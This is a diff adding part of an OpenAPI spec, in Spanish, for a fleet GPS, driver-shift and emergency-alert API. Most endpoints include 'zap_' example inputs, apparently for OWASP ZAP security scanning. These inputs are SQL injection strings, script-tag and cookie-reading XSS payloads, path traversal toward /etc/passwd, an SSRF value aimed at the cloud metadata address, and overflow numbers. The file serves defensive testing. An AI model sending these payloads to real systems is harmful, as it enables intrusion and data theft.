+        '200': { description: Lista de proveedores }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/plantilla:
+    get:
+      summary: Plantilla GPS (proveedor por query) (solo ADMIN)
+      tags: [GPS]
+      parameters:
+        - name: proveedor
+          in: query
+          schema: { type: string, enum: [GPSCONTROL, GLOBALGPS] }
+          examples:
+            valido: { value: "GPSCONTROL" }
+            zap_sqli: { value: "' OR '1'='1" }
+      responses:
+        '200': { description: Plantilla CSV }
+        '400': { description: Proveedor inválido }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/plantilla/{proveedor}:
+    get:
+      summary: Plantilla GPS por proveedor en path (solo ADMIN)
+      tags: [GPS]
+      parameters:
+        - name: proveedor
+          in: path
+          required: true
+          schema: { type: string, enum: [GPSCONTROL, GLOBALGPS] }
+          examples:
+            valido: { value: "GPSCONTROL" }
+            zap_traversal: { value: "GPSCONTROL/../../../etc/passwd" }
+            zap_sqli: { value: "' OR '1'='1" }
+      responses:
+        '200': { description: Plantilla del proveedor }
+        '400': { description: Proveedor inválido }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/validar:
+    post:
+      summary: Validar archivo CSV GPS (solo ADMIN)
+      tags: [GPS]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/GpsImportRequest' }
+            examples:
+              valido:
+                value:
+                  proveedor: "GPSCONTROL"
+                  nombre_archivo: "test.csv"
+                  csv: "fecha,hora,placa,latitud,longitud,velocidad,rumbo,distancia_total\n2026-05-01,08:00:00,ABC-123,-12.0464,-77.0428,60,180,1000"
+              zap_sqli_csv:
+                value:
+                  proveedor: "GPSCONTROL"
+                  nombre_archivo: "test.csv"
+                  csv: "fecha,hora,placa,latitud,longitud,velocidad,rumbo,distancia_total\n' OR '1'='1,08:00:00,ABC-123,-12.0464,-77.0428,60,180,1000"
+              zap_xss_csv:
+                value:
+                  proveedor: "GPSCONTROL"
+                  nombre_archivo: "test.csv"
+                  csv: "fecha,hora,placa,latitud,longitud,velocidad,rumbo,distancia_total\n2026-05-01,08:00:00,<script>alert(1)</script>,-12.0464,-77.0428,60,180,1000"
+              zap_proveedor_invalido:
+                value:
+                  proveedor: "' OR '1'='1"
+                  nombre_archivo: "test.csv"
+                  csv: "fecha,hora,placa\n2026-05-01,08:00:00,ABC"
+      responses:
+        '200': { description: Resultado de validación }
+        '400': { description: Error en el archivo }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/importar:
+    post:
+      summary: Importar archivo CSV GPS (solo ADMIN)
+      tags: [GPS]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/GpsImportRequest' }
+            examples:
+              valido:
+                value:
+                  proveedor: "GPSCONTROL"
+                  nombre_archivo: "tracking.csv"
+                  csv: "fecha,hora,placa,latitud,longitud,velocidad,rumbo,distancia_total\n2026-05-01,08:00:00,ABC-123,-12.0464,-77.0428,60,180,1000"
+              zap_ssrf_csv:
+                value:
+                  proveedor: "GPSCONTROL"
+                  nombre_archivo: "test.csv"
+                  csv: "fecha,hora,placa,latitud,longitud,velocidad,rumbo,distancia_total\n2026-05-01,08:00:00,http://169.254.169.254/,-12.0464,-77.0428,60,180,1000"
+      responses:
+        '200': { description: Importación procesada }
+        '400': { description: Error en el archivo }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/resumen:
+    get:
+      summary: Resumen métricas GPS (solo ADMIN)
+      tags: [GPS]
+      responses:
+        '200': { description: Resumen GPS }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/registros:
+    get:
+      summary: Registros GPS almacenados (solo ADMIN)
+      tags: [GPS]
+      parameters:
+        - name: proveedor
+          in: query
+          schema: { type: string, enum: [GPSCONTROL, GLOBALGPS] }
+        - name: placa
+          in: query
+          schema: { type: string }
+          examples:
+            normal: { value: "ABC-123" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_xss: { value: "<script>alert(1)</script>" }
+      responses:
+        '200': { description: Lista de registros GPS }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  # =========================================================
+  # JORNADAS
+  # =========================================================
+  /jornadas:
+    get:
+      summary: Listar jornadas (ADMIN, GERENTE)
+      tags: [Jornadas]
+      parameters:
+        - name: q
+          in: query
+          schema: { type: string }
+          examples:
+            normal: { value: "Carlos" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_xss: { value: "<script>alert(1)</script>" }
+        - name: conductor_id
+          in: query
+          schema: { type: string, format: uuid }
+        - name: fecha_desde
+          in: query
+          schema: { type: string, format: date, example: "2026-01-01" }
+        - name: fecha_hasta
+          in: query
+          schema: { type: string, format: date, example: "2026-12-31" }
+      responses:
+        '200': { description: Lista de jornadas }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+    post:
+      summary: Crear jornada (ADMIN, GERENTE)
+      tags: [Jornadas]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/CreateJornadaRequest' }
+            examples:
+              valido:
+                value:
+                  conductor_id: "22222222-2222-2222-2222-222222222222"
+                  unidad_id: "aaaa0003-0000-0000-0000-000000000003"
+                  contrato_id: "bbbb0001-0000-0000-0000-000000000001"
+                  creado_por: "11111111-1111-1111-1111-111111111111"
+                  fecha_jornada: "2026-06-01"
+                  origen: "Lima"
+                  destino: "Arequipa"
+                  km_estimados: 520
+              zap_xss_origen:
+                value:
+                  conductor_id: "22222222-2222-2222-2222-222222222222"
+                  unidad_id: "aaaa0003-0000-0000-0000-000000000003"
+                  contrato_id: "bbbb0001-0000-0000-0000-000000000001"
+                  creado_por: "11111111-1111-1111-1111-111111111111"
+                  fecha_jornada: "2026-06-01"
+                  origen: "<script>alert(1)</script>"
+                  destino: "Arequipa"
+                  km_estimados: 520
+              zap_sqli_conductor:
+                value:
+                  conductor_id: "' OR '1'='1"
+                  unidad_id: "aaaa0003-0000-0000-0000-000000000003"
+                  contrato_id: "bbbb0001-0000-0000-0000-000000000001"
+                  creado_por: "11111111-1111-1111-1111-111111111111"
+                  fecha_jornada: "2026-06-01"
+                  origen: "Lima"
+                  destino: "Arequipa"
+                  km_estimados: 520
+      responses:
+        '201': { description: Jornada creada }
+        '400': { description: Error de validación o conductor/unidad ocupados }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /jornadas/exportar:
+    get:
+      summary: Exportar jornadas CSV (ADMIN, GERENTE)
+      tags: [Jornadas]
+      parameters:
+        - name: q
+          in: query
+          schema: { type: string }
+        - name: conductor_id
+          in: query
+          schema: { type: string, format: uuid }
+        - name: fecha_desde
+          in: query
+          schema: { type: string, format: date }
+        - name: fecha_hasta
+          in: query
+          schema: { type: string, format: date }
+      responses:
+        '200':
+          description: CSV de jornadas
+          content:
+            text/csv:
+              schema: { type: string }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /jornadas/historial-gerencial:
+    get:
+      summary: Historial gerencial de jornadas (ADMIN, GERENTE) — no documentado oficialmente
+      tags: [Jornadas]
+      parameters:
+        - name: conductor
+          in: query
+          schema: { type: string }
+          examples:
+            normal: { value: "Carlos" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_xss: { value: "<script>alert(1)</script>" }
+        - name: estado_alerta
+          in: query
+          schema: { type: string, enum: [PANICO, AUXILIO_MECANICO] }
+        - name: fecha_desde
+          in: query
+          schema: { type: string, format: date }
+        - name: fecha_hasta
+          in: query
+          schema: { type: string, format: date }
+        - name: observaciones
+          in: query
+          schema: { type: string }
+      responses:
+        '200': { description: Historial gerencial con alertas }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /jornadas/historial-gerencial/metrics:
+    get:
+      summary: Métricas del historial gerencial (ADMIN, GERENTE) — no documentado oficialmente
+      tags: [Jornadas]
+      parameters:
+        - name: fecha_desde
+          in: query
+          schema: { type: string, format: date }
+        - name: fecha_hasta
+          in: query
+          schema: { type: string, format: date }
+      responses:
+        '200': { description: KPIs del historial }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /jornadas/actual/{conductorId}:
+    get:
+      summary: Jornada actual del conductor (solo CHOFER)
+      tags: [Jornadas]
+      parameters:
+        - name: conductorId
+          in: path
+          required: true
+          schema: { type: string, format: uuid }
+          examples:
+            valido: { value: "22222222-2222-2222-2222-222222222222" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_traversal: { value: "../../etc/passwd" }
+            zap_overflow: { value: "99999999999999999999999999999999999999999999" }
+      responses:
+        '200': { description: Jornada actual o null si no hay activa }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /jornadas/alerta/{jornadaId}:
+    get:
+      summary: Detalle de alerta de una jornada (ADMIN, GERENTE) — no documentado oficialmente
+      tags: [Jornadas]
+      parameters:
+        - name: jornadaId
+          in: path
+          required: true
+          schema: { type: string, format: uuid }
+          examples:
+            valido: { value: "cccc0001-0000-0000-0000-000000000001" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_traversal: { value: "../../etc/passwd" }
+      responses:
+        '200': { description: Detalle de la alerta asociada a la jornada }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+        '404': { description: Jornada no encontrada }
+
+  /jornadas/iniciar:
+    post:
+      summary: Iniciar turno de jornada (solo CHOFER)
+      tags: [Jornadas]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/IniciarJornadaRequest' }
+            examples:
+              valido: { value: { jornada_id: "cccc0003-0000-0000-0000-000000000003" } }
+              zap_sqli: { value: { jornada_id: "' OR '1'='1" } }
+              zap_overflow: { value: { jornada_id: "99999999999999999999999999999999999999999999" } }
+      responses:
+        '200': { description: Jornada iniciada }
+        '400': { description: Estado inválido o jornada ya iniciada }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+        '404': { description: Jornada no encontrada }
+
+  /jornadas/finalizar:
+    post:
+      summary: Finalizar turno de jornada (solo CHOFER)
+      tags: [Jornadas]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/FinalizarJornadaRequest' }
+            examples:
+              valido:
+                value: { jornada_id: "cccc0002-0000-0000-0000-000000000002", km_recorridos: 300, observaciones: "Sin incidencias" }
+              zap_xss_obs:
+                value: { jornada_id: "cccc0002-0000-0000-0000-000000000002", km_recorridos: 300, observaciones: "<script>alert(document.cookie)</script>" }
+              zap_sqli:
+                value: { jornada_id: "' OR '1'='1", km_recorridos: 0, observaciones: "test" }
+              zap_overflow_km:
+                value: { jornada_id: "cccc0002-0000-0000-0000-000000000002", km_recorridos: 99999999999999999999999999999999999999999999, observaciones: "test" }
+      responses:
+        '200': { description: Jornada finalizada }
+        '400': { description: Jornada no está EN_PROCESO }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+        '404': { description: Jornada no encontrada }
+
+  # =========================================================
+  # ALERTAS — no documentadas oficialmente, encontradas en código
+  # =========================================================
+  /alertas/indicadores:
+    get:
+      summary: Indicadores del panel de alertas (solo ADMIN) — no documentado oficialmente
+      tags: [Alertas]
+      responses:
+        '200': { description: Contadores de alertas activas, auxilios y resueltas }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /alertas/activas:
+    get:
+      summary: Alertas activas y en proceso (solo ADMIN) — no documentado oficialmente
+      tags: [Alertas]
+      parameters:
+        - name: tipo
+          in: query
+          schema: { type: string, enum: [PANICO, AUXILIO_MECANICO, OBSERVACION] }
+        - name: estado
+          in: query
+          schema: { type: string, enum: [ACTIVA, EN_PROCESO] }
+      responses:
+        '200': { description: Lista de alertas no resueltas }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /alertas/sos:
+    post:
+      summary: Registrar SOS pánico desde app móvil (solo CHOFER) — no documentado oficialmente
+      tags: [Alertas]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/RegisterSosRequest' }
+            examples:
+              valido:
+                value:
+                  jornada_id: "cccc0002-0000-0000-0000-000000000002"
+                  conductor_id: "33333333-3333-3333-3333-333333333333"
+                  latitud: -12.0464
+                  longitud: -77.0428
+                  direccion: "Lima Centro"
+              zap_xss_direccion:
+                value:
+                  jornada_id: "cccc0002-0000-0000-0000-000000000002"
+                  conductor_id: "33333333-3333-3333-3333-333333333333"
+                  latitud: -12.0464
+                  longitud: -77.0428
+                  direccion: "<script>alert(document.cookie)</script>"
+              zap_sqli_jornada:
+                value:
+                  jornada_id: "' OR '1'='1"
+                  conductor_id: "33333333-3333-3333-3333-333333333333"
+                  latitud: -12.0464
+                  longitud: -77.0428
+              zap_coordenadas_extremas:
+                value:
+                  jornada_id: "cccc0002-0000-0000-0000-000000000002"
+                  conductor_id: "33333333-3333-3333-3333-333333333333"
+                  latitud: 9999999
+                  longitud: 9999999
+      responses:
+        '200': { description: Alerta SOS registrada con mensaje de bloqueo }
+        '400': { description: Campos requeridos inválidos }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+        '409': { description: Jornada no está EN_PROCESO }
+
+  /alertas/auxilio:
+    post:
+      summary: Registrar auxilio mecánico desde app móvil (solo CHOFER) — no documentado oficialmente
+      tags: [Alertas]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/RegisterAuxilioRequest' }
+            examples:
+              valido:
+                value:
+                  jornada_id: "cccc0002-0000-0000-0000-000000000002"
+                  conductor_id: "33333333-3333-3333-3333-333333333333"
+                  tipo_falla_mecanica: "Pinchazo/Llantas"
+                  latitud: -12.0464
+                  longitud: -77.0428
+                  direccion: "Lima Centro"
+              zap_xss_detalle:
+                value:
+                  jornada_id: "cccc0002-0000-0000-0000-000000000002"
+                  conductor_id: "33333333-3333-3333-3333-333333333333"
+                  tipo_falla_mecanica: "Otro"
+                  latitud: -12.0464
+                  longitud: -77.0428
+                  detalle: "<img src=x onerror=alert(document.cookie)>"
+              zap_falla_invalida:
+                value:
+                  jornada_id: "cccc0002-0000-0000-0000-000000000002"
+                  conductor_id: "33333333-3333-3333-3333-333333333333"
+                  tipo_falla_mecanica: "' OR '1'='1"
+                  latitud: -12.0464
+                  longitud: -77.0428
+      responses:
+        '200': { description: Auxilio mecánico registrado }
+        '400': { description: Tipo de falla inválido o campos requeridos faltantes }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+        '409': { description: Jornada no está EN_PROCESO }
+
+  /alertas/{id}/resolver:
+    patch:
+      summary: Resolver alerta de emergencia (solo ADMIN) — no documentado oficialmente
+      tags: [Alertas]
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string, format: uuid }
+          examples:
+            valido: { value: "dddd0001-0000-0000-0000-000000000001" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_traversal: { value: "../../etc/passwd" }
+      requestBody:
+        required: false
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/ResolverAlertaRequest' }
+            examples:
+              valido:
+                value: { detalle_resolucion: "Atendida por central", servicio_tecnico_realizado: "No aplica" }
+              zap_xss_detalle:
+                value: { detalle_resolucion: "<script>alert(document.cookie)</script>" }
+              zap_sqli_detalle:
+                value: { detalle_resolucion: "' OR '1'='1" }
+      responses:
+        '200': { description: Alerta resuelta }
+        '400': { description: Alerta ya resuelta }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+        '404': { description: Alerta no encontrada }
+
+  /alertas/{id}/estado:
+    patch:
+      summary: Actualizar estado de alerta de auxilio (solo ADMIN) — no documentado oficialmente
+      tags: [Alertas]
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string, format: uuid }
+          examples:
+            valido: { value: "dddd0001-0000-0000-0000-000000000001" }
+            zap_sqli: { value: "' OR '1'='1" }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/ActualizarEstadoAlertaRequest' }
+            examples:
+              en_proceso: { value: { estado: "EN_PROCESO" } }
+              resuelta: { value: { estado: "RESUELTA" } }
+              zap_sqli: { value: { estado: "' OR '1'='1" } }
+              zap_xss: { value: { estado: "<script>alert(1)</script>" } }
+      responses:
+        '200': { description: Estado actualizado }
+        '400': { description: Tipo no es AUXILIO_MECANICO o estado inválido }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+        '404': { description: Alerta no encontrada }
